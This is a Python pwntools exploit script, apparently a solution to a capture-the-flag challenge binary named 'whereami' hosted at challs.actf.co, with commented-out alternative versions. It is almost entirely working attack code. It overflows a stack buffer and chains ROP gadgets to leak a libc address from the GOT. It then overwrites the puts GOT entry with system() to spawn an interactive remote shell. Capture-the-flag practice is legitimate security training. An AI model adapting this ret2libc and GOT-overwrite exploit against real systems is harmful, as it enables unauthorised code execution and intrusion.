from pwn import *
context.log_level = 'DEBUG'
context.binary = elf = context.binary = ELF('whereami')
libc = ELF('libc.so.6')

io = remote('challs.actf.co', 31222)
# io = process('./whereami')
to_fill = 0x40 + 8

rop = ROP(elf)
# leak printf GOT address
printf_got = elf.got['printf']
rop.puts(elf.got.printf)

# overwrite printf GOT entry with libC system() address
puts_got = elf.got['puts']
rop.gets(puts_got)  # overwrite this with system from libc

IHopeYouFindTooStr = 0x40201F
rop.gets(IHopeYouFindTooStr)  # overwrite this with '/bin/sh'

payload = b'A' * to_fill + rop.chain()  # after this is done, will execute puts('I hope..) which by now is modified to system('/bin/sh')
io.recvuntil(b'Who are you? ')
io.sendline(payload)


leak = u64(io.recvline().strip().ljust(8, b'\x00'))

print('printf GOT leak:', hex(leak))
libc_printf_offset = libc.symbols['printf']
libc_system_offset = libc.symbols['system']
BIN_SH_offset_searched = next(libc.search(b"/bin/sh"))

libc_base = leak - libc_printf_offset
libc_system = libc_base + libc_system_offset
libc_BIN_SH = libc_base + BIN_SH_offset_searched
print('libc base:', hex(libc_base))
print('system:', hex(libc_system))
print('binsh:', hex(libc_BIN_SH))

io.sendline(p64(libc_system))
io.sendline(p64(libc_BIN_SH))

io.interactive()

#
# payload = b'A' * to_fill + p64(POP_RDI) + p64(libc_BIN_SH) + p64(libc_system)
# print(payload)
# #payload = b'A' * to_fill + p64(libc_one_gadget)  # return directly to libc onegadget
# print(payload)
# #io.interactive()
# io.sendline(payload)
# io.interactive()

# alternative way but doesnt work for this (same reason as manual way)
# from pwn import *
#
# context.binary = elf = context.binary = ELF('whereami')
# libc = ELF('libc.so.6')
#
# p = remote('challs.actf.co', 31222)
# to_fill = 0x40 + 8
#
# rop = ROP(elf)
# rop.puts(elf.sym.printf)
# rop.main()
#
# p.sendline(flat({0x40 + 8: rop.chain()}))
# p.recvuntil(b'Who are you? ')
# p.recvline()
# leak = u64(p.recvline().strip().ljust(8, b'\x00'))
#
# log.info(f"leak: {hex(leak)}")
#
# libc.address = leak - libc.sym.printf
# binsh = next(libc.search(b"/bin/sh"))
#
# rop = ROP([libc, elf])
# rop.system(binsh)
#
# p.sendline(flat({0x40 + 8: rop.chain()}))
# p.interactive()
